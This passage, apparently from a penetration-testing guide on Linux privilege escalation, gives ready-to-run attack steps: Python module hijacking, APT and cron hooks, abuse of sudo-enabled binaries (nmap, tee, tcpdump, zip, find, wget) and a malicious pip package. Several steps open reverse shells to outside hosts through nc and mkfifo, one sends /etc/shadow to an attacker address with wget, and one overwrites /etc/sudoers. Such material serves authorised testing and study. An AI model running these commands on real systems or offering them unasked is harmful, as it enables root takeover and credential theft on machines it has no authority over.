We can use this to privilege escalate to the higher privileges. As python would imports modules in the current directory first, then from the modules dir (PYTHONPATH), we could make a malicious python script (of the same name of import module such as ftplib or example) and have it imported by the program. The malicious script may have a function similar to used in example.py executing our command. e.g.

    <example.py>
    #!/usr/bin/python3
    import os

    def display():
       os.system("whoami")
       exit()

The result would be “root”. This is mainly because <a href="https://docs.python.org/2/library/sys.html#sys.path" class="reference external">sys.path</a> is populated using the current working directory, followed by directories listed in your PYTHONPATH environment variable, followed by installation-dependent default paths, which are controlled by the site module.

**Example**

If we run our script with sudo (sudo myscript.py) then the environment variable $USER will be root and the environment variable $SUDO\_USER will be the name of the user who executed the command sudo myscript.py. Consider the following scenario:

A linux user bob is logged into the system and possesses sudo privileges. He writes the following python script named myscript.py:

    #!/usr/bin/python
    import os
    print os.getenv("USER")
    print os.getenv("SUDO_USER")

He then makes the script executable with chmod +x myscript.py and then executes his script with sudo privileges with the command:

    sudo ./myscript.py

The output of that program will be (using python 2.x.x):

    root
    bob

If bob runs the program without sudo privileges with

    ./myscript.py

he will get the following output:

    bob
    None

## MySQL Privileged Escalation

If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c" class="reference external">User-Defined Function (UDF) Dynamic Library Exploit</a> . Refer <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" class="reference external">Gaining a root shell using mysql user defined functions and setuid binaries</a>

### More Information

-   The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.
-   When MySQL is initialized, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.
-   Commands can be executed inside MySQL, however, commands are executed as the current logged in user.

    mysql> \! sh

## Cron.d

Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.

## Unattended APT - Upgrade

If we have a ability to upload files to the host at any location (For. example misconfigured TFTP server) and APT-Update/ Upgrade is running at a set interval (Basically unattended-upgrade or via-a-cronjob), then we can use APT-Conf to run commands

### DPKG

Debconf configuration is initiated with following line. The command in brackets could be any arbitrary command to be executed in shell.

    Dpkg::Pre-Install-Pkgs {"/usr/sbin/dpkg-preconfigure --apt || true";};

There are also options

    Dpkg::Pre-Invoke {"command";};
    Dpkg::Post-Invoke {"command";};

They execute commands before/ after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);

### APT

-   APT::Update::Pre-Invoke {“your-command-here”};
-   APT::Update::Post-Invoke-Success, which is invoked after successful updates (i.e. package information updates, not upgrades);
-   APT::Update::Post-Invoke, which is invoked after updates, successful or otherwise (after the previous hook in the former case).

To invoke the above, create a file in /etc/apt/apt.conf.d/ folder specifying the NN\<Name\> and keep the code in that

For example:

    APT::Update::Post-Invoke{"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f";};

When the apt-update would be executed, it would be executed as root and we would get a shell as a root.

## SUDO -l Permissions

Let’s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find, zip and package installers (pip, npm).

### nmap suid

    nmap --script <(echo 'require "os".execute "/bin/sh"')

or

    nmap --interactive

### tee suid

If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any\_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let’s say tidy.sh is executed as root on the server, we can write the below code in temp.sh

    temp.sh
    echo "example_user ALL=(ALL) ALL" > /etc/sudoers

or

    chmod +w /etc/sudoers to add write properties to sudoers file to do the above

and then

    cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh

which will add contents of temp.sh to tidyup.sh. (Assuming tidyup.sh is running as root by crontab)

### tcpdump

The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).

Create a temp.sh ( which contains the commands to executed as root )

    id
    /bin/nc 192.168.110.1 4444 -e /bin/bash

Execute the command

    sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root

where

    -C file_size : Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).

    -W Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a 'rotating' buffer.  In addition, it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly. Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in cyclical files per timeslice.

    -z postrotate-command Used in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file " where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip will compress each savefile using gzip or bzip2.

    Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn't disturb the capture process.

    And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &  arguments arrangements and execute the command that you want.

     -Z user
     --relinquish-privileges=user If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.

     This behavior can also be enabled by default at compile time.

### zip

    touch /tmp/exploit
    sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"

### find

If find is suid, we can use

    touch foo
    find foo -exec whoami \;

Here, the foo file (a blank file) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.

HollyGrace has mentioned this in <a href="https://www.gracefulsecurity.com/linux-privesc-abusing-suid/" class="reference external">Linux PrivEsc: Abusing SUID</a> More can be learn <a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" class="reference external">How-I-got-root-with-sudo</a>.

### wget

If the user has permission to run wget as sudo, we can read files (if the user whom we are sudo-ing have the permisson to read) by using –post-file parameter

    post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.

Example:

    sudo -u root wget --post-file=/etc/shadow http://AttackerIP:Port

On the attacker side, there can be a nc listener. The above would send the contents of /etc/shadow to the listener in the post request.

### Package Installation

**pip**

If the user have been provided permission to install packages as a sudo for example

    User username may run the following commands on hostname:
       (root) /usr/bin/pip install *

We can exploit this by creating a custom pip package which would provide us a shell.

First, create a folder (Let’s name it helloworld), and create two files setup.py and helloworld.py

    username@hostname:/tmp/helloworld$ ls
    helloworld.py setup.py

Let’s see, what setup.py contains

    cat setup.py

    from setuptools import setup
    import os
    print os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.26 4444 >/tmp/f")

    setup(
        name='helloworld-script',    # This is the name of your PyPI-package.
        version='0.1',               # Update the version number for new releases
        scripts=['helloworld']       # The name of your scipt, and also the command you'll be using for calling it
    )

and helloworld.py

    cat helloworld.py
    #!/usr/bin/env python
    print "Hello World"

The above can be a part of a sample package of python pip. For more details refer <a href="https://github.com/pypa/sampleproject" class="reference external">A sample project that exists for PyPUG’s “Tutorial on Packaging and Distributing Projects”</a> , <a href="http://python-packaging.readthedocs.io/en/latest/index.html" class="reference external">How To Package Your Python Code</a> , <a href="https://stackoverflow.com/questions/22051360/a-simple-hello-world-setuptools-package-and-installing-it-with-pip" class="reference external">A simple Hello World setuptools package and installing it with pip</a> and <a href="https://packaging.python.org/tutorials/distributing-packages/" class="reference external">Packaging and distributing projects</a>

The above package can be installed by using

    sudo -u root /usr/bin/pip install -e /tmp/helloworld

    Obtaining file:///tmp/helloworld

The above would execute setup.py and provide us the shell.

Refer <a href="https://packaging.python.org/tutorials/installing-packages/" class="reference external">Installing Packages</a> for different ways to install a pip package

Let’s see the installed application

    pip list
    Flask-CouchDB (0.2.1)
    helloworld-script (0.1, /tmp/helloworld)
    Jinja2 (2.10)

**npm**

npm allows packages to take actions that could result in a malicious npm package author to create a worm that spreads across the majority of the npm ecosystem. Refer <a href="https://www.kb.cert.org/vuls/id/319816" class="reference external">npm fails to restrict the actions of malicious npm packages</a> , <a href="https://github.com/joaojeronimo/rimrafall" class="reference external">npm install could be dangerous: Rimrafall</a> and <a href="https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability" class="reference external">Package install scripts vulnerability</a>

## Unix Wildcards

The below text is directly from the <a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt" class="reference external">DefenseCode Unix WildCards Gone Wild</a>.